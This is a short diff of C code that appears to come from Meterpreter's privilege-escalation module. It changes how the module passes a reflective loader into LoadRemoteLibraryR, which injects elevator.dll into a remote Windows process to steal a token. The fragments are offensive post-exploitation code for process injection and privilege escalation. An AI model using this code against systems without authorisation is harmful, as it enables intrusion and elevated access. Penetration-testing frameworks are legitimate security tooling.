@@ -2,6 +2,7 @@
 #include "common_metapi.h"
 #include "tokendup.h"
 #include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
+#include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"
 
 /*
  * Enable or disable a privilege in our processes current token.
@@ -77,6 +78,8 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 
 	do
 	{
+		LPCSTR reflectiveLoader = met_api->packet.get_tlv_value_reflective_loader(packet);
+
 		// only works on x86 systems for now...
 		if( elevate_getnativearch() != PROCESS_ARCH_X86 )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_debug. Unsuported platform", ERROR_BAD_ENVIRONMENT );
@@ -153,7 +156,7 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 					break;
 
 				// use RDI to inject the elevator.dll into the remote process, passing in the command line to elevator.dll
-				hThread = LoadRemoteLibraryR( hProcess, lpServiceBuffer, dwServiceLength, lpRemoteCommandLine );
+				hThread = LoadRemoteLibraryR( hProcess, lpServiceBuffer, dwServiceLength, reflectiveLoader, lpRemoteCommandLine );
 				if( !hThread )
 					break;
 
